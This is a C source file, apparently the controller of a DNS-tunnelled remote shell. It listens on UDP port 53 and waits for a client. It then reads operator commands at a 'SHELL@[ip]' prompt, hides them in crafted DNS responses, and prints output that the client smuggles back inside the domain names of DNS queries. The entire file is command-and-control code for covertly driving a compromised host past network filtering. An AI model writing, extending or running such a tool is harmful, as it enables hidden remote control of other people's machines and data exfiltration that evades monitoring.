
#include"header.h"
#include<pthread.h>
#include<sys/select.h>
#include<sys/time.h>
#include"dns_packet_op.h"
#include"base64.h"

int recv_stand_dn = 0;//if change the value,we must use a lock....but i am not,just a demo

void *udp_recv_thread(void *arg)
{
        int sockfd_pt;
        int res;
        int ret;
        char data[512];
        socklen_t len;
        struct timeval tv;
        fd_set fs;
        dp_t recv_pk_info;
        struct sockaddr_in rc_sa;

        sockfd_pt = *(int *)arg;

        memset(data,0,512);
        memset(&recv_pk_info,0,sizeof(dp_t));

        tv.tv_sec = 10;
        tv.tv_usec = 0;

        FD_ZERO(&fs);
        FD_SET(sockfd_pt,&fs);

        while(1) {
                tv.tv_sec = 10;
                tv.tv_usec = 0;
                FD_ZERO(&fs);
                FD_SET(sockfd_pt,&fs);
                ret = select(sockfd_pt + 1, &fs, NULL, NULL, &tv);
                if (ret > 0) {
                        res = recvfrom(sockfd_pt,data,512,0,(struct sockaddr *)&rc_sa,&len);
                        if (res < 0) {
                                perror("recv");
                                _exit(EXIT_FAILURE);
                        }else if (res == 0){
                                printf("recv EOF\n");
                                _exit(EXIT_SUCCESS);
                        }else{
                                res = parse_dns_packet_req((unsigned char *)data,res,&recv_pk_info);
                                if (!res) {
                                        printf("%s",recv_pk_info.domain_name);
                                }else{
                                        recv_stand_dn = 1;
                                }
                                memset(data,0,res);
                                memset(&recv_pk_info,0,sizeof(dp_t));
                        }
                }
        }
}

int main()
{
        int sockfd;
        int port = 53;
        char *ip;
        int res;
        struct sockaddr_in local_sa;
        struct sockaddr_in dest_sa;
        char buf[512];
        char cmd[128];
        dp_t pk_info;
        drs_t response;
        pthread_t pt;

        sockfd = socket(AF_INET,SOCK_DGRAM,0);
        if (sockfd == -1) {
                perror("socket:");
                exit(1);
        }

        local_sa.sin_family = AF_INET;
        local_sa.sin_port = htons(port);
        local_sa.sin_addr.s_addr = INADDR_ANY;

        res = bind(sockfd,(struct sockaddr *)&local_sa,sizeof(struct sockaddr));
        if (res == -1) {
                perror("bind:");
                close(sockfd);
                exit(1);
        }

        int len = sizeof(struct sockaddr_in);

        res = recvfrom(sockfd,buf,512,0,(struct sockaddr *)&dest_sa,(socklen_t *)&len);
        ip = inet_ntoa(dest_sa.sin_addr);
        recv_stand_dn = 1;
        printf("client connect @ %s\n\n",ip);

        int ret;
        ret = pthread_create(&pt,NULL,udp_recv_thread,&sockfd);
        if (ret != 0) {
                printf("create recv thread error\n");
        }
        pthread_detach(pt);

        while (1) {
                while(!recv_stand_dn) {
                        usleep(10);
                };
                fflush(stdin);
                printf("\nSHELL@[%s]>> ",ip);
                fflush(stdout);
                memset(cmd,0,128);

                fgets(cmd,126,stdin);
                if (strlen(cmd) == 1) {
                        continue;
                }
                *(cmd + strlen(cmd) - 1) = '\0';
                memset((unsigned char *)&response,0,sizeof(response));
                strcpy(response.shell_cmd,cmd);
                response.sc_length = strlen(cmd);
                response.packet_flag = pk_info.packet_flag;

                make_dns_response_pk((unsigned char *)buf,res,&response);

                sendto(sockfd,response.res_buf,response.res_buf_length,0,(struct sockaddr *)&dest_sa,len);
                recv_stand_dn = 0;
        } 
}
